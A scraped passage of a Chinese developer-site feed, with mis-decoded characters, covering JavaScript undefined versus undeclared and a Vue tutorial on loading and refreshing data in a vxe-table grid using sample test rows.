<h3 data-id="heading-6">2.2 undefined ä¸undeclared çš„åŒºåˆ« ?</h3>
<p>undefinedï¼šå·²ç»å£°æ˜äº†ï¼Œä½†è¿˜æ²¡å€¼</p>
<p>undeclaredï¼šå‹æ ¹æ²¡å£°æ˜è¿‡ï¼ŒJS æ ¹æœ¬ä¸çŸ¥é“å®ƒæ˜¯è°</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">let</span> a;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(a); <span class="hljs-comment">// undefined</span>
<span class="hljs-keyword">typeof</span> a; <span class="hljs-comment">// "undefined" åˆæ³•ï¼Œä¸æŠ¥é”™</span>
</code></pre>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(b);
<span class="hljs-title class_">ReferenceError</span>: b is not defined <span class="hljs-comment">//undeclared æ˜¯ä¸€ç§ä»£ç é”™è¯¯çŠ¶æ€</span>
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[vue è¡¨æ ¼ vxe-table åŠ è½½æ•°æ®çš„å‡ ç§æ–¹å¼ï¼Œæ›´æ–°æ•°æ®çš„ç”¨æ³•]]></title>    <link>https://juejin.cn/post/7592759140038328361</link>    <guid>https://juejin.cn/post/7592759140038328361</guid>    <pubDate>2026-01-08T10:02:59.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592759140038328361" data-draft-id="7592818202716962835" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="vue è¡¨æ ¼ vxe-table åŠ è½½æ•°æ®çš„å‡ ç§æ–¹å¼ï¼Œæ›´æ–°æ•°æ®çš„ç”¨æ³•"/> <meta itemprop="keywords" content="Vue.js"/> <meta itemprop="datePublished" content="2026-01-08T10:02:59.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ”¾ç‰›çš„å°ä¼™"/> <meta itemprop="url" content="https://juejin.cn/user/4250049649848345"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            vue è¡¨æ ¼ vxe-table åŠ è½½æ•°æ®çš„å‡ ç§æ–¹å¼ï¼Œæ›´æ–°æ•°æ®çš„ç”¨æ³•
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4250049649848345/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ”¾ç‰›çš„å°ä¼™
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T10:02:59.000Z" title="Thu Jan 08 2026 10:02:59 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>vue è¡¨æ ¼ vxe-table åŠ è½½æ•°æ®çš„å‡ ç§æ–¹å¼ï¼Œæ›´æ–°æ•°æ®çš„ç”¨æ³•ï¼Œvue æœ€å¼ºå¤§çš„è¡¨æ ¼ç»„ä»¶ï¼Œæ”¯æŒ vue2 å’Œ vue3ï¼ŒåŠŸèƒ½å¤ªå¤šï¼Œè¿™é‡Œä»‹ç»åŸºç¡€ç”¨æ³•</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fvxetable.cn" target="_blank" title="https://vxetable.cn" ref="nofollow noopener noreferrer">vxetable.cn</a></p>
<h2 data-id="heading-0">åŒå‘ç»‘å®š data æ–¹å¼</h2>
<p>æ•°æ®æ˜¯åŒå‘åŒæ­¥çš„ï¼Œä¿®æ”¹ data å°±å¯ä»¥è‡ªåŠ¨åˆ·æ–°</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/52ac30e2f7f54764bb7cec8793410640~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pS-54mb55qE5bCP5LyZ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768471378&amp;x-signature=3hrNOUR3mG3aAdwmBdYskB%2FdbHk%3D" alt="11111111111111111-ezgif.com-video-to-gif-converter" loading="lazy"/></p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">vxe-button</span> <span class="hljs-attr">status</span>=<span class="hljs-string">"primary"</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"loadList1Event"</span>&gt;</span>ä¿®æ”¹1<span class="hljs-tag">&lt;/<span class="hljs-name">vxe-button</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">vxe-button</span> <span class="hljs-attr">status</span>=<span class="hljs-string">"primary"</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"loadList2Event"</span>&gt;</span>ä¿®æ”¹2<span class="hljs-tag">&lt;/<span class="hljs-name">vxe-button</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">vxe-button</span> <span class="hljs-attr">status</span>=<span class="hljs-string">"primary"</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"loadList3Event"</span>&gt;</span>ä¿®æ”¹3<span class="hljs-tag">&lt;/<span class="hljs-name">vxe-button</span>&gt;</span>

    <span class="hljs-tag">&lt;<span class="hljs-name">vxe-grid</span> <span class="hljs-attr">v-bind</span>=<span class="hljs-string">"gridOptions"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">vxe-grid</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { reactive } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>

<span class="hljs-keyword">const</span> gridOptions = <span class="hljs-title function_">reactive</span>({
  <span class="hljs-attr">border</span>: <span class="hljs-literal">true</span>,
  <span class="hljs-attr">height</span>: <span class="hljs-number">300</span>,
  <span class="hljs-attr">columns</span>: [
    { <span class="hljs-attr">type</span>: <span class="hljs-string">'seq'</span>, <span class="hljs-attr">width</span>: <span class="hljs-number">70</span> },
    { <span class="hljs-attr">field</span>: <span class="hljs-string">'name'</span>, <span class="hljs-attr">title</span>: <span class="hljs-string">'Name'</span> },
    { <span class="hljs-attr">field</span>: <span class="hljs-string">'sex'</span>, <span class="hljs-attr">title</span>: <span class="hljs-string">'Sex'</span> },
    { <span class="hljs-attr">field</span>: <span class="hljs-string">'age'</span>, <span class="hljs-attr">title</span>: <span class="hljs-string">'Age'</span> },
    { <span class="hljs-attr">field</span>: <span class="hljs-string">'address'</span>, <span class="hljs-attr">title</span>: <span class="hljs-string">'Address'</span>, <span class="hljs-attr">showOverflow</span>: <span class="hljs-literal">true</span> }
  ],
  <span class="hljs-attr">data</span>: []
})

<span class="hljs-keyword">const</span> <span class="hljs-title function_">loadList1Event</span> = (<span class="hljs-params"/>) =&gt; {
  gridOptions.<span class="hljs-property">data</span> = [
    { <span class="hljs-attr">id</span>: <span class="hljs-number">10008</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test8'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Develop'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Man'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">35</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">10009</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test9'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Test'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Man'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">26</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">10010</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test10'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Develop'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Man'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">38</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">10011</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test11'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Test'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Women'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">29</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">10012</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test12'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Develop'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Man'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">27</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> }
  ]
}

<span class="hljs-keyword">const</span> <span class="hljs-title function_">loadList2Event</span> = (<span class="hljs-params"/>) =&gt; {
  gridOptions.<span class="hljs-property">data</span> = [
    { <span class="hljs-attr">id</span>: <span class="hljs-number">10003</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test3'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'PM'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Man'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">32</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'Shanghai'</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">10004</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test4'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Designer'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Women'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">23</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">10005</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test5'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Develop'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Women'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">30</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'Shanghai'</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">10006</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test6'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Designer'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Women'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">21</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">10007</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test7'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Test'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Man'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">29</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">10008</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test8'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Develop'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Man'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">35</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">10009</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test9'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Test'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Man'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">26</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">10010</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test10'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Develop'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Man'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">38</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">10011</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test11'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Test'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Women'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">29</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">10012</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test12'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Develop'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Man'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">27</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">10013</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test13'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Test'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Women'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">24</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">10014</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test14'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Develop'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Man'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">34</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> }
  ]
}
<span class="hljs-keyword">const</span> <span class="hljs-title function_">loadList3Event</span> = (<span class="hljs-params"/>) =&gt; {
  gridOptions.<span class="hljs-property">data</span> = [
    { <span class="hljs-attr">id</span>: <span class="hljs-number">10001</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test1'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Develop'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Man'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">28</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">10002</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test2'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Test'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Women'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">22</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'Guangzhou'</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">10003</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test3'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'PM'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Man'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">32</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'Shanghai'</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">10004</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test4'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Designer'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Women'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">23</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">10005</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test5'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Develop'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Women'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">30</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'Shanghai'</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">10006</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test6'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Designer'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Women'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">21</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">10007</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test7'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Test'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Man'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">29</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">10008</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test8'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Develop'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Man'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">35</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">10009</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test9'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Test'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Man'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">26</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">10010</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test10'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Develop'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Man'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">38</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">10011</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test11'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Test'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Women'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">29</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">10012</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test12'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Develop'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Man'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">27</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">10013</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test13'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Test'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Women'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">24</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">10014</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test14'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Develop'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Man'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">34</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">10015</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test15'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Test'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Man'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">21</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">10016</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test16'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Develop'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Women'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">20</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">10017</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test17'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Test'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Man'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">31</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">10018</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test18'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Develop'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Women'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">32</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">10019</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test19'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Test'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Man'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">37</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">10020</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Test20'</span>, <span class="hljs-attr">role</span>: <span class="hljs-string">'Develop'</span>, <span class="hljs-attr">sex</span>: <span class="hljs-string">'Man'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">41</span>, <span class="hljs-attr">address</span>: <span class="hljs-string">'test abc'</span> }
  ]
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h2 data-id="heading-1">è°ƒç”¨æ–¹æ³•åˆ·æ–°æ•°æ®</h2>
<p>é™¤äº†ä¿®æ”¹ data ä¹‹å¤–ï¼Œè¿˜å¯ä»¥é€šè¿‡è°ƒç”¨ loadDataã€reloadData æ–¹æ³•åˆ·æ–°æ•°æ®</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5bee5837f2dc449883c5ac2c136ffbb1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pS-54mb55qE5bCP5LyZ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768471378&amp;x-signature=4W4ITREgPgxTnGX1JosiM1NmDrs%3D" alt="22222222222222222-ezgif.com-video-to-gif-converter" loading="lazy"/></p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
